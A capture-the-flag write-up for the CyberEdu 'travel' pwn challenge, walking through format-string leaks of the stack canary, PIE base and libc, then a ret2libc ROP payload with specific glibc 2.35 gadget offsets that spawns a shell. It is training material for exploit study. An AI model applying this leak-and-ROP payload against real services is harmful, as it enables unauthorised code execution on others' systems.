+++
date = '2026-01-03'
draft = false
title = 'CyberEdu travel Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
+++

Happy New Year! 🎇

## Challenge overview

Travel agency as a **[service](https://app.cyber-edu.co/challenges/05090610-44a4-11ed-ba64-0fbb056be1da?tenant=cyberedu)**

![challenge-screenshot](pic1.png#center)

We're given a `libc.so.6` and a **main** 64-bit binary, with `NX`, `PIE` and a canary enabled. We immediately bump into a format string vulnerability.

![challenge-screenshot](pic2.png#center)

We only have one function, `main`, and a buffer overflow along the format string. So we can start trying to leak the canary, PIE base and libc. 

So, PIE ret2libc with a canary. 

---

## Identifying the vulnerabilities

There's a little problem though. The canary was at offset `%33$p`, the PIE base at `%37$p`, the maybe-libc at `%35$p`. From the first input, we can find out two addresses, and from the second input, the remaining one; but that's when we send out payload, and we need to know all three of them for a successful payload. 

So to do this, we can first find the canary and the PIE base, use them to go back to `main`, and only *then* figure out libc. Problem is, we didn't know the offset from libc to these values we were leaking.

Another problem, no `pop rdi; ret` gadgets! 

![challenge-screenshot](pic3.png#center)

We do have a `ret` one at `PIE + 0x101a` though.

So I thought, why not try a `one_gadget` here? `libc` also had some pop rdi gadgets, but we still need `libc` for that. So to use `libc` we need to know an address, and to find an address we need to know `libc`. *In the end I scrapped that one_gadget idea*.

![challenge-screenshot](pic4.png#center)

Here is the `glibc` version with proof. I tried some of its functions ending it `040`, because the second time we enter main, the `libc` address gets shifted to `%43$p` on the stack and looks like `0x7d15d0291040` or `0x786173b35040`. But none of them worked, so we really do have to guess it.

I tried bruteforcing up to five bytes, but it didn't work. Wanna guess why? Because for some *fucking* reason these offsets were *dynamic*. So they weren't *really* offsets. Good thing I figured that out a couple of hours later, after running three different brute scripts.

![challenge-screenshot](off1.png#center)

![challenge-screenshot](off2.png#center)

The reason I could actually look at the offsets is I ran it locally, and to get accurate results, I had to use their version of `libc`. They did give us the `libc.so.6`, but to actually test stuff, we needed the loader as well, which I managed to download pretty quickly using this command:

`wget http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3_amd64.deb` (Thanks ChatGPT)

Then, I looked for the loader, and looked for the libc.so.6 as well, to compare the checksum of the challenge libc.so.6 to this version's, just to check if they were the same. They were! Great success.

I added this to my pwntools script and I was ready for testing:

```python
p = process(
    ["./ld-linux-x86-64.so.2", elf.path],
    env={"LD_LIBRARY_PATH": "."}
    )
```

Back to the issue. So this was a complete pain, because now we really have no way of finding libc. Stil, I told myself that there's no way we can do this without libc, and looked up to `%100$p` and found offsets looking like this:

```python
# for 43 value looks like 0x7d15d0291040
#		                  0x786173b35040

# for 53: libc leak: 0x7940ccfeee40
		        #    0x79d460eece40
		        #    0x7a3b95a43e40

# for 56:   0x7e89e8a592e0
#	        0x7eb5607302e0
```

But none of them seemed *stable* enough. I left the problem alone for a couple of days, because of New Year stuff, and went at it again today, and I really had no clue why I didn't start looking at offsets from `%1$p` and instead started at 30 or something. 

Another thing, they were indeed different from the first time we looked at them (to find the canary and PIE, if you remember), everything was shifted. Eventually I found this at `%3$p`, looking very promising:

![challenge-screenshot](lucky.png#center)

At this point I was crossing all my fingers hoping I would get a stable offset, and somehow - I did! 

```python
libc = libc_leak - 0x114a37
```
We already know the version, as we are testing on it, and here we can see the gadgets we needed, in libc:

![challenge-screenshot](rop.png#center)

~~My kali has so little ram running the first command crashed my entire vm at first, actually~~

---

## The exploit

Brace yourself because this was truly, and I mean truly horrible (for me, at least).

As I said, the one_gadget didn't work, so I used these offsets:

```python
pop_rdi_ret = libc + 0x2a3e5
ret = libc + 0x2a3e6
system = libc + 0x50d60 
binsh = libc + 0x1d8698
```

I settled with this `ret`, the one after the `pop rdi`, but the others might work too, no clue. This was my payload:

```python
payload = (b"a"*200 + #v5
	   p64(canary) +
	   b"r"*8 + #rbp
	   p64(pop_rdi_ret) + #main after push rbp
	   p64(binsh) +
	   p64(ret) +
	   p64(system) +
	   p64(0x0) 
	   )
```

Seemed correct, right? But for some reason unbeknownst to me, the `system` was getting pushed and popped as only its last byte, testing locally.

![challenge-screenshot](crap2.png#center)

I spent at least two hours trying to debug this, and, as you know, debugging PIEs is annoying in itself, doing everything, finding four alternative `ret` gadgets, moving them around between every line in the payload, trying padding of every size on every part of system, just grueling stuff.

Then I thought to myself there's no way this payload is wrong, and "errors" like these on local files *have* happened before. So I tested it remotely. And yeah.

![challenge-screenshot](flag.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/travel.py)**.
